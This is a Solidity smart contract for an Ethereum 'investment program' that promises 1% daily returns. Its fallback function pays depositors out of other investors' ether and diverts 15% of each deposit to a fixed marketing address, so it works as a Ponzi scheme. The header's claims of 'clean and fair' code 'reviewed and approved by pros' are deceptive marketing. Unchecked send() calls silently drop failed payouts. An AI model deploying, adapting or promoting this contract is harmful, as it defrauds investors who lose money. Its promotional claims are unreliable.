1 pragma solidity ^0.4.25;
2 
3 /**
4  *
5  *  https://smart-blockchain.pro
6  *  High profit investment program
7  *  - More than 30% monthly gain! 1% per day!
8  *  - Huge promotion campaign for a long life of our Project
9  *  - Clean and fair smart code used
10  *
11  *	based on easyInvest SC
12  *
13  * How to use:
14  *  1. Send any amount of ether to make an investment
15  *  2a. Claim your profit by sending 0 ether transaction any time
16  *  OR
17  *  2b. Send more ether to reinvest AND get your profit at the same time
18  *
19  * RECOMMENDED GAS LIMIT: 200000
20  * RECOMMENDED GAS PRICE: get from https://ethgasstation.info/
21  *
22  * Contract reviewed and approved by pros!
23  *
24  */
25 contract SmartBlockchainPro {
26     // records amounts invested
27     mapping (address => uint256) invested;
28     // records blocks at which investments were made
29     mapping (address => uint256) atBlock;
30 	
31 	// address to collect budgets for marketing campaign
32 	address public marketingAddr = 0x43bF9E5f8962079B483892ac460dE3675a3Ef802;
33 
34     // this function called every time anyone sends a transaction to this contract
35     function () external payable {
36         // if sender (aka YOU) is invested more than 0 ether
37         if (invested[msg.sender] != 0) {
38             // calculate profit amount as such:
39             // amount = (amount invested) * 1% * (blocks since last transaction) / 5900
40             // 5900 is an average block count per day produced by Ethereum blockchain
41             uint256 amount = invested[msg.sender] * 1 / 100 * (block.number - atBlock[msg.sender]) / 5900;
42 
43             // send calculated amount of ether directly to sender (aka YOU)
44             address sender = msg.sender;
45             sender.send(amount);
46         }
47 
48 		if (msg.value != 0) {
49 			// marketing commission is 15% from your investment
50 			marketingAddr.send(msg.value * 15 / 100);
51 		}
52 		
53         // record block number and invested amount (msg.value) of this transaction
54         atBlock[msg.sender] = block.number;
55         invested[msg.sender] += msg.value;
56     }
57 }